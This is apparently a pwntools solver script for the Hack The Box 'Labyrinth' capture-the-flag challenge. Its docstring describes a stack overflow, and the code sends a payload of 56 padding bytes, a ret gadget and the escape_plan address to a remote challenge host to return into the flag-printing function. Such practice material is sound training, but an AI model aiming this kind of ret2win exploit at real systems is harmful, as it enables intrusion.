#!/usr/bin/env python3
"""
Labyrinth (HTB Try Out, easy pwn) — solver.

main() reads 5 bytes into a malloc'd buffer, then requires strncmp(buf,"69",2)==0
OR strncmp(buf,"069",3)==0 ("correct door") before the vulnerable
fgets(buf@rbp-0x30, 0x44) — 68 bytes into a 48-byte buffer. No PIE, no canary.
Overflow the saved RIP (offset 56) with escape_plan() (0x401255) which
opens ./flag.txt and prints it.
"""

from pwn import *

HOST = "154.57.164.71"
PORT = 32089

context.log_level = "info"
context.arch = "amd64"

e = ELF(r"files/_work/challenge/labyrinth")
ESCAPE_PLAN = 0x401255  # e.symbols['escape_plan']
RET = 0x4010A0          # plain `ret` gadget (stack alignment for variadic fprintf)

r = remote(HOST, PORT)
r.recvuntil(b"> ")  # prompt after the maze / door selection

# First input: correct door ("69" matches strncmp 2 bytes)
r.sendline(b"69")

# Second input: overflow. (Offset to RIP = 0x30 + 8 = 56.)
# escape_plan is entered via `ret` (rsp%16==0) but was compiled for `call`
# (rsp%16==8); the misaligned stack crashes its variadic fprintf, so insert a
# `ret` gadget first to fix alignment.
payload = b"A" * 56 + p64(RET) + p64(ESCAPE_PLAN)
r.sendline(payload)

out = r.recvall(timeout=5)
with open("solve/evidence/out.txt", "wb") as f:
    f.write(out)
flag = re.search(rb"HTB\{[^}]+\}", out)
if flag:
    print("FLAG:", flag.group(0).decode())
    with open("final_flag.txt", "w") as f:
        f.write(flag.group(0).decode() + "\n")
else:
    print("no flag found; output saved to solve/evidence/out.txt")
r.close()
